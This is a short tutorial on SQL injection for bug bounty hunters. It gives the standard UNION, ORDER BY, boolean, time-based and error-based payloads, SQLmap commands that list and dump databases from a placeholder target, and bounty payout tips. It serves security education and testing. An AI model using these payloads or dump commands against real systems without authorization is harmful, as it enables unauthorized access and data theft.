## SQL Injection (SQLi) — Complete Overview

SQL Injection is one of the most common and critical web vulnerabilities where an attacker can interfere with the queries that an application makes to its database. It allows unauthorized access, data leakage, and in some cases, full system compromise.

---

### Manual Testing for SQLi

Manual SQLi is often tested through user input fields like search boxes, login forms, or URL parameters. Basic types of manual injections include:

#### Union-Based Injection

Used to fetch data from other tables via the `UNION` keyword.

```sql
' UNION SELECT 1,2,3-- -
```

#### Order By Injection

Used to identify the number of columns.

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
```

Stop when the query breaks — that's your column count.

---

### Automated Testing Using SQLmap

SQLmap is a powerful tool to automate SQL Injection detection and exploitation.

#### Common Usage Patterns:

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

* `--dbs`: Lists all available databases.
* `-D [database] --tables`: Lists all tables in the specified database.
* `-D [database] -T [table] --columns`: Lists all columns of the specified table.
* `--dump`: Dumps data from the target database/table.

---

## Blind SQL Injection

Blind SQLi occurs when there is no visible output, but the application’s behavior or response time reveals information.

### 1. Substring-Based Blind SQLi

Used for brute-forcing data character by character.

```sql
SELECT SUBSTRING(database(),1,1)
```

### 2. Boolean-Based Blind SQLi

Observe true/false logic:

```sql
' AND 1=1-- -
' AND 1=2-- -
```
Different response pages or content confirms injection.

### 3. Time-Based Blind SQLi

Check delay in server response:

```sql
' OR SLEEP(5)-- -
```
If the response is delayed, the application is likely vulnerable.

### 4. Error-Based SQLi

For databases configured to display SQL errors:

```sql
' OR 1=1 ORDER BY CASE WHEN (1=1) THEN NULL ELSE column_name END-- -
```

This triggers database errors and reveals backend structure.

🔗 [Live SQLi Simulation Playground (DB Fiddle)](https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5)

---

## Bug Bounty Tip:

Even low-level SQLi vulnerabilities (like blind or in cookies) can fetch:

* 🔒 **\$100 to \$500** on platforms like HackerOne and Bugcrowd.
* 🔐 High CVSS ratings if it leads to data leakage or privilege escalation.

---

### 🔹 Real-world Examples:

* [HackerOne Reports – Union Based SQLi](https://hackerone.com/reports/1046084)
* [HackerOne Reports – SQLi](https://hackerone.com/reports/1044716)
